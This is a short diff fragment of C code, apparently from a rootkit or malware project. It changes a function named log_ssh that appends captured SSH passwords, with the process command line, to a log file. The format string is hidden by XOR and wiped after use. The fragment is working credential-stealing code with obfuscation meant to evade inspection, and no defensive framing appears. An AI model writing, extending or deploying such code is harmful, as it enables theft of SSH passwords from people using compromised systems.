@@ -43,7 +43,7 @@ ssize_t log_ssh(int fd, void *buf, ssize_t o){
             ssh_start = 0;
             if((fp = xfopen(SSH_LOGS, "a"))){
                 xor(fstr, FMT_STR);
-                (void)fprintf(fp, fstr, process_info.mycmdline, ssh_pass);
+                (void)fprintf(fp, fstr, get_process_cmdline(getpid()), ssh_pass);
                 clean(fstr);
                 (void)fflush(fp);
                 (void)fclose(fp);
